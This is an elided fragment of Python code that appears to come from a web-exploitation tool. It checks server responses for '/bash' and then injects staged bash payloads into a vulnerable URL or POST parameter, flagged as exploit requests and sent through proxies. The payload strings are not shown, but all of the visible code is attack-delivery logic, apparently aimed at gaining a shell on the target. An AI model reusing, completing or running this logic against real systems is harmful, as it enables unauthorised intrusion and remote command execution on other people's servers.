        ...
        if "/bash" in res.text:
            ...
            if args.postreq:
                request.REQUEST(
                    url,
                    args.httpheaders,
                    post.replace(config.tempArg, encode(bashTmpPayloadStageOne)),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                ...
                request.REQUEST(
                    url,
                    args.httpheaders,
                    post.replace(config.tempArg, encode(bashTmpPayloadStageTwo)),
                    config.proxies,
                    "",
                    "",
                    exploit=True,
                ...
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashTmpPayloadStageOne)),
                    args.httpheaders,
                    post,
                    config.proxies,
                    "",
                ...
                request.REQUEST(
                    url.replace(config.tempArg, encode(bashTmpPayloadStageTwo)),
                    args.httpheaders,
                    post,
                    config.proxies,
                    "",
    ...
    if method == "CMD":
        ...
        if "/bin" in res.text and "/bash" in res.text:
            ...
            if args.postreq:
                ...
                request.REQUEST(
                    url.replace(config.tempArg, bashPayloadStageOne),
                    args.httpheaders,
                    "",
                    config.proxies,
                    "",
                ...
                request.REQUEST(
                    url.replace(config.tempArg, bashPayloadStageTwo),
                    args.httpheaders,
                    "",
                    config.proxies,
                    "",
